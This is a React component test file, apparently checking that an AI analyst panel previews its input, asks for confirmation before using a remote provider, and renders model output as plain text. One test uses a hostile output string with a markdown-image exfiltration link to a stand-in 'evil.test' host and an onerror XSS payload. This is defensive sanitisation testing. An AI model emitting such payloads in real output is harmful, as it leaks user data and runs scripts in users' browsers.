import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import {
  explainRun,
  getExplanation,
  previewExplanation,
  type Explanation,
  type ExplanationPreview,
} from "../lib/analyst";
import { AnalystPanel } from "./AnalystPanel";

vi.mock("../lib/analyst", () => ({
  previewExplanation: vi.fn(),
  explainRun: vi.fn(),
  getExplanation: vi.fn(),
}));

function preview(overrides: Partial<ExplanationPreview> = {}): ExplanationPreview {
  return {
    input: '<data>\n<nonce>abc</nonce>\n- answer_match: score=0.4\n</data>',
    input_hash: "hash-1",
    provider_id: "provider-1",
    provider_name: "Local analyst",
    model: "analyst-m",
    prompt_version: "analyst-v1",
    provider_is_local: true,
    ...overrides,
  };
}

function explanation(overrides: Partial<Explanation> = {}): Explanation {
  return {
    status: "none",
    text: "",
    message: "",
    model: null,
    provider_name: null,
    prompt_version: null,
    created_at: null,
    input_hash: null,
    ...overrides,
  };
}

describe("AnalystPanel", () => {
  beforeEach(() => {
    vi.mocked(previewExplanation).mockReset();
    vi.mocked(explainRun).mockReset();
    vi.mocked(getExplanation).mockReset();
    vi.mocked(getExplanation).mockResolvedValue(explanation());
  });

  it("shows the exact input before anything is sent", async () => {
    vi.mocked(previewExplanation).mockResolvedValue(
      preview({ input: '<data>\n<nonce>abc</nonce>\n<b>not markup</b>\n</data>' }),
    );

    const { container } = render(<AnalystPanel runId="run-1" />);

    const shown = await screen.findByTestId("analyst-preview-input");
    expect(shown).toHaveTextContent("not markup");
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(explainRun).not.toHaveBeenCalled();
  });

  it("needs an extra confirmation for a remote provider, then sends it", async () => {
    vi.mocked(previewExplanation).mockResolvedValue(
      preview({ provider_is_local: false, provider_name: "Remote analyst" }),
    );
    vi.mocked(explainRun).mockResolvedValue(
      explanation({ status: "ok", text: "Answer match is low.", model: "remote-m" }),
    );
    const user = userEvent.setup();

    render(<AnalystPanel runId="run-1" />);

    const button = await screen.findByTestId("analyst-explain");
    expect(button).toBeDisabled();
    expect(screen.getByTestId("analyst-provider-note")).toHaveTextContent("remote");

    await user.click(screen.getByTestId("analyst-confirm-remote"));
    await user.click(screen.getByTestId("analyst-explain"));

    expect(explainRun).toHaveBeenCalledWith("run-1", true);
    expect(await screen.findByTestId("analyst-text")).toHaveTextContent("Answer match is low.");
  });

  it("renders the model's words as text, never as markup", async () => {
    vi.mocked(previewExplanation).mockResolvedValue(preview());
    vi.mocked(explainRun).mockResolvedValue(
      explanation({
        status: "ok",
        text: 'Look ![x](http://evil.test/?q=leak) <img src=x onerror=alert(1)> <a href="#">here</a>',
      }),
    );
    const user = userEvent.setup();

    const { container } = render(<AnalystPanel runId="run-1" />);

    await user.click(await screen.findByTestId("analyst-explain"));

    const text = await screen.findByTestId("analyst-text");
    expect(text.textContent).toContain("evil.test");
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(screen.getByTestId("analyst-explanation")).toHaveTextContent(
      "It may be wrong and does not affect the verdict",
    );
    expect(explainRun).toHaveBeenCalledWith("run-1", false);
  });

  it("shows a neutral message when the answer was rejected", async () => {
    vi.mocked(previewExplanation).mockResolvedValue(preview());
    vi.mocked(explainRun).mockResolvedValue(
      explanation({ status: "rejected", message: "The model's answer was not stored." }),
    );
    const user = userEvent.setup();

    render(<AnalystPanel runId="run-1" />);

    await user.click(await screen.findByTestId("analyst-explain"));

    expect(await screen.findByTestId("analyst-rejected")).toHaveTextContent(
      "The model's answer was not stored.",
    );
    expect(screen.queryByTestId("analyst-text")).toBeNull();
  });

  it("says what to do when no analyst model is chosen", async () => {
    vi.mocked(previewExplanation).mockRejectedValue(
      new Error("Choose an analyst provider and model in Settings first."),
    );

    render(<AnalystPanel runId="run-1" />);

    expect(await screen.findByTestId("analyst-unavailable")).toHaveTextContent(
      "Choose an analyst provider and model in Settings first.",
    );
    expect(screen.queryByTestId("analyst-explain")).toBeNull();
  });
});
